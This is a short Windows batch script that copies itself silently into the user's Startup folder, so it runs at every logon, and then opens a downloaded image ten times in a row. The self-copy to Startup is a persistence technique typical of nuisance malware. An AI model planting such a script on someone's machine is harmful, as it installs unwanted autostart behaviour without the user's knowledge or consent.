@echo off
set startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
set scriptPath=%~f0

:: Copy the batch file to the Startup folder
copy "%scriptPath%" "%startupFolder%\open_live.bat" /Y

:: Open the image 10 times
for /L %%i in (1,1,10) do (
    start "" "%USERPROFILE%\Downloads\honus\live.jpg"
    timeout /NOBREAK /T 1 >nul
)

exit